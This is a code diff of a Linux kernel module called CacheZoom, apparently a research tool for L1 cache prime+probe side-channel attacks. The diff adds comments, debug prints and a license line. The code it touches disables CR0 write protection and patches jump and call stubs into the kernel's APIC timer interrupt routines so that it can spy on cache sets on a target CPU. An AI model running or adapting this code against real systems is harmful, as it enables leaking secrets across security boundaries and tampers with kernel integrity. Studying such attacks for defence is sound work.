@@ -48,13 +48,16 @@ typedef struct _measurement_type {
 Measurement * measurements = NULL;
 
 unsigned long long m_counter = 0; 
+/* volatile -- compiler does not delete(considering it does not do anything useful) or use optimization with the code
+       mfence --  preventing reordering of loads/stores
+       mov -- move the data pointed by rbx to regsiter rbx */
 
 
 #define \
 prime(_table, _set)({\
   do {\
     register uint16_t delta;\
-    asm volatile(\
+    asm volatile(\                      
       "mfence;"\
       "mov (%%rbx), %%rbx;"\
       "mov (%%rbx), %%rbx;"\
@@ -77,6 +80,8 @@ prime(_table, _set)({\
 #define PRIME_16 PRIME_8; PRIME_8
 #define PRIME_32 PRIME_16; PRIME_16
 #define PRIME_64 PRIME_32; PRIME_32
+
+/* rdtsc -- Loads the current value of the processor's time-stamp counter into the EDX:EAX registers */ 
 
 #define \
 probe(_table, _set)({\
@@ -167,6 +172,9 @@ void write_down_measurements(void)
 static void attack_handler(void);
 static int deadline_handler(unsigned long delta, void * evt);
 
+
+//hooks the two interrupt routines local_apic_timer_interrupt
+//and lapic_next deadline
 static void enable_attack_timer()
 {
   unsigned int target_addr;
@@ -174,6 +182,14 @@ static void enable_attack_timer()
   unsigned char  jmp_stub[] = {0xe9, 0xf1, 0xf2, 0xf3, 0xf4};
 
   m_counter = 0;
+  //CRO is control registers available on x86 cpu, controlling
+  //cpu featrues related to memory protection
+  //and multitasking, these registers are accessed by the special
+  //instruction which the compiler does not usally generate.
+  //It corresponds to following assembly code:
+  //mov eax, cr0  or eax, 0x10000 mov cr0, eax
+  //or operation sets the bit 16 which allows the superviosr level
+  //to write on all virtual memory also when it is labled as read only too
   write_cr0 (read_cr0 () & (~ 0x10000));
 
   target_addr = attack_handler - plocal_apic_timer_interrupt - 5;  
@@ -181,20 +197,24 @@ static void enable_attack_timer()
   call_stub[2] = ((char*)&target_addr)[1];
   call_stub[3] = ((char*)&target_addr)[2];
   call_stub[4] = ((char*)&target_addr)[3];
+  //memcpy((void*)destination, const void* src, len(src))
+  printk(KERN_ALERT "CACHEZOOM: %p\n", plocal_apic_timer_interrupt);
+  printk(KERN_ALERT "CACHEZOOM: %p\n", plapic_next_deadLine);
   memcpy((void*)plocal_apic_timer_interrupt, call_stub, sizeof(call_stub));  
-
+  //printk("CACHEZOOM: hellooo\n");
   target_addr = deadline_handler - plapic_next_deadLine - 5;
   jmp_stub[1] = ((char*)&target_addr)[0];
   jmp_stub[2] = ((char*)&target_addr)[1];
   jmp_stub[3] = ((char*)&target_addr)[2];
   jmp_stub[4] = ((char*)&target_addr)[3];
-  memcpy((void*)plapic_next_deadLine, jmp_stub, sizeof(jmp_stub));  
+  memcpy((void*)plapic_next_deadLine, jmp_stub, sizeof(jmp_stub)); 
+  printk("CACHEZOOM: hellooo\n"); 
 
   write_cr0 (read_cr0 () | 0x10000);
 
   hooked = true;
  
-  printk("CACHEZOOM: ENABLED\n");
+  printk("\nCACHEZOOM: ENABLED\n");
 }
 
 static void disable_attack_timer()
@@ -231,18 +251,19 @@ static long cachezoom_ioctl_test(struct file *filep,
   unsigned int cmd, unsigned long arg)
 {
   register int _CURRENT_SET_;
+  printk(KERN_ALERT "Test Hello");
   asm(".align 64");
   for(_CURRENT_SET_ = 0; _CURRENT_SET_ < CPU_L1_CACHE_SET_COUNT; _CURRENT_SET_++)
     prime(_SPY_POINTER_LIST_, _CURRENT_SET_);
   
+  printk(KERN_ALERT "Test Hello");
   asm volatile(".align 64");
 
   for(_CURRENT_SET_ = 0; _CURRENT_SET_ < CPU_L1_CACHE_SET_COUNT; _CURRENT_SET_++)
     probe(_SPY_POINTER_LIST_, _CURRENT_SET_);
 
-  for(_CURRENT_SET_ = 0; _CURRENT_SET_ < CPU_L1_CACHE_SET_COUNT; _CURRENT_SET_++){
+  for(_CURRENT_SET_ = 0; _CURRENT_SET_ < CPU_L1_CACHE_SET_COUNT; _CURRENT_SET_++)
     printk(KERN_ALERT "%d: %d\n", _CURRENT_SET_, *(_SPY_POINTER_LIST_ + idx0(_CURRENT_SET_) + 2));
-  }
   
   printk("............................................................\n"); 
   return 0;
@@ -258,6 +279,11 @@ static long cachezoom_ioctl_init(struct file *filep,
   plocal_apic_timer_interrupt = param->param_1;
   timer_interval_tsc = param->param_2;
   target_cpu = param->param_3;
+  printk(KERN_ALERT "CACHEZOOM_IOCTL_INIT 1: %p\n", plapic_next_deadLine);
+  printk(KERN_ALERT "CACHEZOOM_IOCTL_INIT 2: %p\n", plocal_apic_timer_interrupt);
+  printk(KERN_ALERT "CACHEZOOM_IOCTL_INIT 3: %d\n", timer_interval_tsc);
+  printk(KERN_ALERT "CACHEZOOM_IOCTL_INIT 4: %d\n", target_cpu);
+
   return 0;
 }
 
@@ -268,7 +294,8 @@ static long cachezoom_ioctl_install_timer(struct file *filep,
   return 0;
 }
 
-
+//defining a function pointer, which takes the given
+//arguments as input and returns long as output
 typedef long (*cachezoom_ioctl_t)(struct file *filep,
 	unsigned int cmd, unsigned long arg);
 
@@ -279,11 +306,12 @@ long cachezoom_ioctl(struct file *filep, unsigned int cmd,
   long ret;
   cachezoom_ioctl_t handler = NULL;
 
+
   switch (cmd) {
     case CACHEZOOM_IOCTL_TEST:
       handler = cachezoom_ioctl_test;
       break;
-    case CACHEZOOM_IOCTL_UNINSTALL_TIMER:
+    case CACHEZOOM_IOCTL_UNINSTALL_TIMER:     
       handler = cachezoom_ioctl_uninstall_timer;
       break;	
     case CACHEZOOM_IOCTL_INSTALL_TIMER:
@@ -295,10 +323,11 @@ long cachezoom_ioctl(struct file *filep, unsigned int cmd,
     default:
       return -EINVAL;
   }
-  
+  //data is copied to kernel memory space
   if (copy_from_user(data, (void __user *) arg, _IOC_SIZE(cmd)))
     return -EFAULT;
 
+  //call the handler function with appropirate arguments
   ret = handler(filep, cmd, (unsigned long) ((void *) data));
 
   if (!ret && (cmd & IOC_OUT)) {
@@ -310,12 +339,15 @@ long cachezoom_ioctl(struct file *filep, unsigned int cmd,
 
 static const struct file_operations cachezoom_fops = {
   .owner = THIS_MODULE,
+  //unlocked_ioctl lets the driver write to choose the locking mechanism for the device
   .unlocked_ioctl = cachezoom_ioctl,
 };
 
 static struct miscdevice cachezoom_miscdev = {
-  .minor = MISC_DYNAMIC_MINOR,
+  //dynamically create a minor number and asign it the device
+  .minor = MISC_DYNAMIC_MINOR, 
   .name = "cachezoom",
+  //pointer to file operations
   .fops = &cachezoom_fops,
 };
 
@@ -327,6 +359,7 @@ static int deadline_handler(unsigned long delta, void * evt)
   if(smp_processor_id() == target_cpu)
   {
     tsc = rdtsc();
+    //writes the second argument to the MSR_IA32_TSC_DEADLINE register
     wrmsrl(MSR_IA32_TSC_DEADLINE, tsc + timer_interval_tsc);		
   }
   else {
@@ -366,14 +399,14 @@ init_spy_set(_table, _set)({\
     int _i;\
     uint32_t cellIdx, nextCellIdx, prevCellIdx;\
     for(_i = 0; _i < CPU_L1_CACHE_SET_ASSOC - 1; _i++){\
-      cellIdx = idx(_i, _set);\
-      nextCellIdx = idx(_i + 1, _set);\
+      cellIdx = ((CPU_L1_LINE_OFFSET_WORD * _i) / 8) + (CPU_L1_CACHE_SET_ASSOC * _set);\
+      nextCellIdx = ((CPU_L1_LINE_OFFSET_WORD * (_i+1)) / 8) + (CPU_L1_CACHE_SET_ASSOC * _set);\
       *(_table + cellIdx) = _table + nextCellIdx;\
     }\
     for(_i = CPU_L1_CACHE_SET_ASSOC + 1; _i > 0; _i--)\
     {\
-        cellIdx = idx(_i, _set) + 1;\
-        prevCellIdx = idx(_i - 1, _set) + 1;\
+        cellIdx = ((CPU_L1_LINE_OFFSET_WORD * _i) / 8) + (CPU_L1_CACHE_SET_ASSOC * _set) + 1;\
+        prevCellIdx = ((CPU_L1_LINE_OFFSET_WORD * (_i-1)) / 8) + (CPU_L1_CACHE_SET_ASSOC * _set) + 1;\
        *(_table + cellIdx) = _table + prevCellIdx;\
     }\
     asm volatile("wbinvd;");\
@@ -382,13 +415,14 @@ init_spy_set(_table, _set)({\
 
 static void spy_list_init(void)
 {
+  //the variable set is stored in register
 	register int set;
 	printk(KERN_ALERT "CACHEZOOM: INIT SPY BUFF\n");
 
 	// Allocate the memory for the pointer lists 
 	_SPY_POINTER_LIST_ = kzalloc(SPY_TABLE_SIZE, GFP_KERNEL); 
 
-  // Initialize the set associative pointers
+  // Initialize the caches
   for(set = 0; set < CPU_L1_CACHE_SET_COUNT; set++)  
     init_spy_set(_SPY_POINTER_LIST_, set);
 }
@@ -398,7 +432,9 @@ static int cachezoom_init(void)
 {
   int ret;
   printk(KERN_ALERT "CACHEZOOM: HELLO\n");
+  
 
+  //registers a chardev with a major number 10
   ret = misc_register(&cachezoom_miscdev);
   if (ret) {
     printk(KERN_ERR "cannot register miscdev(err=%d)\n", ret);
@@ -438,6 +474,7 @@ static void cachezoom_exit(void)
   printk(KERN_ALERT "CACHEZOOM: BYE\n");
 }
 
+MODULE_LICENSE("GPL");
 module_init(cachezoom_init);
 module_exit(cachezoom_exit);
 
